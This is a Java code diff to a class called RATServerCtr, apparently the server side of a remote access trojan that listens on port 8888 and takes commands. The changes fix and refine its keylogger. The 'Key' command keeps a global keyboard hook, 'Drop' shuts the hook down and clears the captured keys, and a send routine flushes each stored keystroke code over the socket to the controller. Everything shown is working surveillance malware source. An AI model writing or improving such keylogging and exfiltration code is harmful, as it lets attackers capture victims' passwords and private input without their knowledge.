@@ -37,6 +37,7 @@ public class RATServerCtr {
     private ArrayList<Socket> list;
     private static Socket s;
     public static ArrayList<Integer> key = new ArrayList<>();
+    public static GlobalKeyboardHook keyHook;
 
     public RATServerCtr() {
         port = 8888;
@@ -79,7 +80,7 @@ public class RATServerCtr {
                 case "Key":
                     sendResult("ok");
                     //sendKeys();
-                    getKeyStrokeOn(key);
+                    keyHook = getKeyStrokeOn(key);
                     break;
                 case "Get":
                     sendResult("ok");
@@ -87,7 +88,9 @@ public class RATServerCtr {
                     break;
                 case "Drop":
                     sendResult("ok");
-                    getKeyStrokeOff(getKeyStrokeOn(key));
+                    keyHook.shutdownHook();
+                    key.clear();
+                    break;
                 default:
                     sendResult("ok");
                     commandHandler(mode); //hand and send res
@@ -174,8 +177,9 @@ public class RATServerCtr {
             dout.writeInt(keys.size());
             for(int keyTemp : keys) {
                 dout.writeInt(keyTemp);
-                //System.out.println(keyTemp);
-            } 
+                System.out.println(keyTemp);
+            }
+            dout.flush();
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -197,15 +201,6 @@ public class RATServerCtr {
             e.printStackTrace();
             
             return null;
-        }
-    }
-    
-    public static boolean getKeyStrokeOff(GlobalKeyboardHook keyboardHook) {
-        try {
-            keyboardHook.shutdownHook();
-            return true;
-        } catch (Exception e) {
-            return false;
         }
     }
 }
